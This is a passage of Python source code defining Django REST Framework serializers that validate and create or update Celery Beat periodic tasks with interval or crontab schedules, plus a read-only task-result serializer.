    crontab_month_of_year = serializers.CharField(required=False, default='*')
    
    def validate_args(self, value):
        """Validate args is valid JSON array"""
        if value:
            try:
                import json
                parsed = json.loads(value)
                if not isinstance(parsed, list):
                    raise serializers.ValidationError("args must be a JSON array")
            except json.JSONDecodeError:
                raise serializers.ValidationError("args must be valid JSON")
        return value
    
    def validate_kwargs(self, value):
        """Validate kwargs is valid JSON object"""
        if value:
            try:
                import json
                parsed = json.loads(value)
                if not isinstance(parsed, dict):
                    raise serializers.ValidationError("kwargs must be a JSON object")
            except json.JSONDecodeError:
                raise serializers.ValidationError("kwargs must be valid JSON")
        return value
    
    def validate(self, data):
        """Validate schedule fields based on schedule_type"""
        schedule_type = data.get('schedule_type')
        
        if schedule_type == 'interval':
            if not data.get('interval_every'):
                raise serializers.ValidationError({
                    'interval_every': 'Required for interval schedule'
                })
        elif schedule_type == 'crontab':
            # Crontab fields have defaults, so they're always valid
            pass
        
        return data
    
    def create(self, validated_data):
        """Create PeriodicTask with schedule"""
        from django_celery_beat.models import PeriodicTask, IntervalSchedule, CrontabSchedule
        
        schedule_type = validated_data.pop('schedule_type')
        
        # Extract schedule fields
        interval_every = validated_data.pop('interval_every', None)
        interval_period = validated_data.pop('interval_period', 'minutes')
        crontab_minute = validated_data.pop('crontab_minute', '*')
        crontab_hour = validated_data.pop('crontab_hour', '*')
        crontab_day_of_week = validated_data.pop('crontab_day_of_week', '*')
        crontab_day_of_month = validated_data.pop('crontab_day_of_month', '*')
        crontab_month_of_year = validated_data.pop('crontab_month_of_year', '*')
        
        # Create schedule
        if schedule_type == 'interval':
            schedule, _ = IntervalSchedule.objects.get_or_create(
                every=interval_every,
                period=interval_period
            )
            validated_data['interval'] = schedule
        else:  # crontab
            schedule, _ = CrontabSchedule.objects.get_or_create(
                minute=crontab_minute,
                hour=crontab_hour,
                day_of_week=crontab_day_of_week,
                day_of_month=crontab_day_of_month,
                month_of_year=crontab_month_of_year,
            )
            validated_data['crontab'] = schedule
        
        return PeriodicTask.objects.create(**validated_data)
    
    def update(self, instance, validated_data):
        """Update PeriodicTask and schedule"""
        from django_celery_beat.models import IntervalSchedule, CrontabSchedule
        
        schedule_type = validated_data.pop('schedule_type', None)
        
        # Extract schedule fields
        interval_every = validated_data.pop('interval_every', None)
        interval_period = validated_data.pop('interval_period', 'minutes')
        crontab_minute = validated_data.pop('crontab_minute', '*')
        crontab_hour = validated_data.pop('crontab_hour', '*')
        crontab_day_of_week = validated_data.pop('crontab_day_of_week', '*')
        crontab_day_of_month = validated_data.pop('crontab_day_of_month', '*')
        crontab_month_of_year = validated_data.pop('crontab_month_of_year', '*')
        
        # Update schedule if type changed or fields changed
        if schedule_type == 'interval':
            schedule, _ = IntervalSchedule.objects.get_or_create(
                every=interval_every or (instance.interval.every if instance.interval else 5),
                period=interval_period
            )
            instance.interval = schedule
            instance.crontab = None
        elif schedule_type == 'crontab':
            schedule, _ = CrontabSchedule.objects.get_or_create(
                minute=crontab_minute,
                hour=crontab_hour,
                day_of_week=crontab_day_of_week,
                day_of_month=crontab_day_of_month,
                month_of_year=crontab_month_of_year,
            )
            instance.crontab = schedule
            instance.interval = None
        
        # Update other fields
        for attr, value in validated_data.items():
            setattr(instance, attr, value)
        
        instance.save()
        return instance


class TaskResultSerializer(serializers.Serializer):
    """Serializer for TaskResult model (read-only)"""
    id = serializers.IntegerField(read_only=True)
    task_id = serializers.CharField(read_only=True)
    task_name = serializers.CharField(read_only=True)
    status = serializers.CharField(read_only=True)
    result = serializers.CharField(read_only=True)
    date_created = serializers.DateTimeField(read_only=True)
    date_done = serializers.DateTimeField(read_only=True)
    traceback = serializers.CharField(read_only=True, allow_null=True)
    meta = serializers.CharField(read_only=True, allow_null=True)
    
    # Computed fields
    duration_seconds = serializers.SerializerMethodField()
    
    def get_duration_seconds(self, obj):
        """Calculate task duration in seconds"""
        if obj.date_created and obj.date_done:
            return (obj.date_done - obj.date_created).total_seconds()
        return None
